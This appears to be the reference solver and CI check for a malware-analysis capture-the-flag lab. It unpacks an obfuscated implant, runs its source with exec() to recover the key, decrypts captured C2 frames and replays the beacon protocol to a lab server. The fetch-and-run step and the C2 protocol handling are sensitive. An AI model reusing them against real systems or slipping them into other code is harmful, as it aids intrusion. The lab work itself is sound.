#!/usr/bin/env python3
"""Reference walkthrough and checks for implant-lab. Used by test.sh (CI) and for
local runs against server.py. Plays a careful analyst: unpacks the sample, reuses its
own functions, speaks the protocol, and also checks the server refuses what it must.

  solve.py <base url> [--header 'Name: value']... [--flag EXPECTED]

Prints the flag it gets. Exits non-zero, with the reason, if any check fails.
"""
import argparse
import base64
import re
import sys
import time
import urllib.error
import urllib.request
import zlib

ap = argparse.ArgumentParser()
ap.add_argument("base")
ap.add_argument("--header", action="append", default=[])
ap.add_argument("--flag")
args = ap.parse_args()
HEADERS = dict(h.split(": ", 1) for h in args.header)


def die(msg):
    print(f"implant-lab: FAIL: {msg}", file=sys.stderr)
    sys.exit(1)


def ok(msg):
    print(f"implant-lab: ok: {msg}", file=sys.stderr)


def http(method, path, data=None):
    req = urllib.request.Request(args.base + path, data=data.encode() if data is not None else None, method=method)
    for k, v in HEADERS.items():
        req.add_header(k, v)
    try:
        with urllib.request.urlopen(req, timeout=20) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()


# 1. Unpack the sample: the outer file is base64 of zlib of the real source.
status, outer = http("GET", "/samples/helper-update.py.txt")
status == 200 or die(f"no sample ({status})")
blob = "".join(re.findall(r'^\s*"([A-Za-z0-9+/=]+)"\s*$', outer, re.M))
inner = zlib.decompress(base64.b64decode(blob)).decode()
"/v3/hb" in inner or die("the unpacked sample is not the implant")
ok("the sample unpacks to the implant source")

# 2. Reuse the implant's own functions (its key constant is XORed; _k() undoes that).
ns = {"__name__": "implant", "__file__": "/tmp/x.py"}
exec(inner, ns)
key, bot = ns["_k"](), ns["_B"]
seal, unseal = (lambda o: ns["_seal"](key, o)), (lambda t: ns["_open"](key, t))
len(key) == 16 or die("the key is not 16 bytes")
for needle in (key.hex(), bot):
    needle in outer and die("the key or bot id is readable in the packed file")
ok("the key is not readable in the packed file")


def post(path, obj, raw=None):
    return http("POST", path, raw if raw is not None else seal(obj))


# 3. The capture is a test vector: our implementation opens every frame in it.
status, cap = http("GET", "/captures/ws0412.cap")
frames = re.findall(r"^  (\S+)$", cap, re.M)
len(frames) == 6 or die(f"capture has {len(frames)} frames")
for f in frames:
    unseal(f)
ok("the captured frames open with the recovered key")
status, _ = post("/v3/hb", None, raw=frames[0])
status == 400 or die(f"a captured frame was accepted again ({status})")
ok("captured frames cannot be replayed")

# 4. The server refuses what it must.
now = int(time.time())
post("/v3/hb", None, raw="AAAA")[0] == 400 or die("garbage accepted")
status, body = post("/v3/hb", {"bot": bot, "t": now})
status == 200 or die(f"hello refused ({status}): {body}")
sid = unseal(body)["sid"]
post("/v3/hb", {"bot": "WS-000000", "t": now})[0] == 400 or die("a wrong bot id was accepted")
post("/v3/hb", {"bot": bot, "t": now - 7200})[0] == 400 or die("a stale hello was accepted")
post("/v3/jobs", {"sid": "0" * 16})[0] == 403 or die("jobs without a session")
post("/v3/out", {"sid": sid, "job": 3, "data": "QQ=="})[0] == 400 or die("a result before the tasking was accepted")
other = bytearray(base64.urlsafe_b64decode(seal({"sid": sid}) + "=="))
other[10] ^= 1
bad = base64.urlsafe_b64encode(bytes(other)).decode().rstrip("=")
post("/v3/jobs", None, raw=bad)[0] == 400 or die("a tampered frame was accepted")
ok("wrong bot, stale time, no session, out of order, tampered: all refused")

# 5. The conversation.
status, body = post("/v3/jobs", {"sid": sid})
status == 200 or die(f"jobs refused ({status})")
job = unseal(body)["jobs"][0]
job["op"] == "collect" or die(f"unexpected job {job}")
status, body = post("/v3/out", {"sid": sid, "job": job["id"], "data": base64.b64encode(b"stolen").decode()})
status == 200 or die(f"result refused ({status}): {body}")
flag = unseal(body)["next_key"]
if args.flag and flag != args.flag:
    die(f"wrong flag {flag!r}")
ok("the operator's acknowledgement carries the next key")
print(flag)
